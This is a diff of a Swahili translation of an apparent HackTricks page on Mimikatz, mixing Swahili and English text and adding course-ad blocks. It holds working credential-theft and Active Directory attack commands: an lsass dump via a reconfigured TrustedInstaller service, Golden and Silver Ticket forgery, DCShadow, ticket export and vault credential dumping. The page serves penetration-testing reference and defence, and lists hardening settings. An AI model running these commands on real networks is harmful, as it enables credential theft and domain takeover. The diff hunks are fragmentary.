@@ -15,15 +15,22 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
+
 **This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!
 
 ## LM na Maneno ya Kawaida katika kumbukumbu
 
 Kuanzia Windows 8.1 na Windows Server 2012 R2 kuendelea, hatua kubwa zimechukuliwa kulinda dhidi ya wizi wa akidi:
 
-- **LM hashes na nywila za maandiko** hazihifadhiwi tena katika kumbukumbu ili kuboresha usalama. Mipangilio maalum ya rejista, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ inapaswa kuwekewa thamani ya DWORD ya `0` ili kuzima Uthibitishaji wa Digest, kuhakikisha kwamba nywila "za maandiko" hazihifadhiwi katika LSASS.
+- **LM hashes na nywila za maandiko ya kawaida** hazihifadhiwi tena katika kumbukumbu ili kuboresha usalama. Mipangilio maalum ya rejista, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ inapaswa kuwekwa na thamani ya DWORD ya `0` ili kuzima Uthibitishaji wa Digest, kuhakikisha kwamba nywila "za maandiko ya kawaida" hazihifadhiwi katika LSASS.
 
-- **Ulinzi wa LSA** umeanzishwa ili kulinda mchakato wa Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindano ya msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato uliohifadhiwa. Kuanzisha Ulinzi wa LSA kunahusisha:
+- **Ulinzi wa LSA** umeanzishwa ili kulinda mchakato wa Mamlaka ya Usalama wa Mitaa (LSA) kutoka kwa usomaji wa kumbukumbu usioidhinishwa na sindano ya msimbo. Hii inafikiwa kwa kuashiria LSASS kama mchakato ulio na ulinzi. Kuanzisha Ulinzi wa LSA kunahusisha:
 1. Kubadilisha rejista katika _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
 2. Kutekeleza Kituo cha Sera ya Kundi (GPO) kinacholazimisha mabadiliko haya ya rejista katika vifaa vinavyosimamiwa.
 
@@ -31,7 +38,7 @@ Licha ya ulinzi huu, zana kama Mimikatz zinaweza kupita Ulinzi wa LSA kwa kutumi
 
 ### Kupambana na Kuondolewa kwa SeDebugPrivilege
 
-Wasimamizi kwa kawaida wana SeDebugPrivilege, ambayo inawawezesha kufuatilia programu. Haki hii inaweza kupunguzwa ili kuzuia matukio yasiyoidhinishwa ya kumbukumbu, mbinu ya kawaida inayotumiwa na washambuliaji kutoa akidi kutoka kwa kumbukumbu. Hata hivyo, hata haki hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kufanya matukio ya kumbukumbu kwa kutumia usanidi maalum wa huduma:
+Wasimamizi kwa kawaida wana SeDebugPrivilege, ambayo inawawezesha kufuatilia programu. Haki hii inaweza kupunguzwa ili kuzuia dump za kumbukumbu zisizoidhinishwa, mbinu ya kawaida inayotumiwa na washambuliaji kutoa akidi kutoka kwa kumbukumbu. Hata hivyo, hata haki hii ikiondolewa, akaunti ya TrustedInstaller bado inaweza kufanya dump za kumbukumbu kwa kutumia usanidi maalum wa huduma:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
@@ -65,29 +72,29 @@ Event log tampering in Mimikatz involves two primary actions: clearing event log
 
 ### Golden Ticket Creation
 
-Golden Ticket inaruhusu upatanishi wa ufikiaji wa kiwango cha kikoa. Amri muhimu na vigezo:
+A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:
 
 - Command: `kerberos::golden`
 - Parameters:
-- `/domain`: Jina la kikoa.
-- `/sid`: Kitambulisho cha Usalama wa kikoa (SID).
+- `/domain`: Jina la eneo.
+- `/sid`: Kitambulisho cha Usalama wa eneo (SID).
 - `/user`: Jina la mtumiaji wa kuiga.
-- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya kikoa.
+- `/krbtgt`: Hash ya NTLM ya akaunti ya huduma ya KDC ya eneo.
 - `/ptt`: Inachoma tiketi moja kwa moja kwenye kumbukumbu.
 - `/ticket`: Huhifadhi tiketi kwa matumizi ya baadaye.
 
-Mfano:
+Example:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Uundaji wa Tiketi ya Silver
+### Silver Ticket Creation
 
-Tiketi za Silver zinatoa ufikiaji kwa huduma maalum. Amri kuu na vigezo:
+Silver Tickets hutoa ufikiaji kwa huduma maalum. Amri muhimu na vigezo:
 
-- Amri: Inafanana na Tiketi ya Dhahabu lakini inalenga huduma maalum.
+- Amri: Inafanana na Golden Ticket lakini inalenga huduma maalum.
 - Vigezo:
 - `/service`: Huduma ya kulenga (mfano, cifs, http).
-- Vigezo vingine vinafana na Tiketi ya Dhahabu.
+- Vigezo vingine vinavyofanana na Golden Ticket.
 
 Mfano:
 ```bash
@@ -114,7 +121,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 - **Pita kwenye Kache**:
 - Amri: `kerberos::ptc`
-- Inachanganya tiketi za Kerberos kutoka kwenye faili za kache.
+- Inachanganya tiketi za Kerberos kutoka kwa faili za kache.
 - Mfano: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
 - **Pita Tiketi**:
@@ -130,7 +137,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 
 ### Uingiliaji wa Active Directory
 
-- **DCShadow**: Fanya mashine kuwa DC kwa muda kwa ajili ya kubadilisha vitu vya AD.
+- **DCShadow**: Fanya mashine kuwa DC kwa muda kwa ajili ya uhamasishaji wa kituo cha AD.
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
 - **DCSync**: Fanya kama DC ili kuomba data za nywila.
@@ -177,7 +184,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **SEKURLSA::Tickets**: Toa tiketi za Kerberos kutoka kwenye kumbukumbu.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Ubadilishaji wa Sid na Token
+### Uhamasishaji wa Sid na Token
 
 - **SID::add/modify**: Badilisha SID na SIDHistory.
 - Ongeza: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
@@ -199,6 +206,12 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - Toa nywila kutoka Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
 
 {% hint style="success" %}
 Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
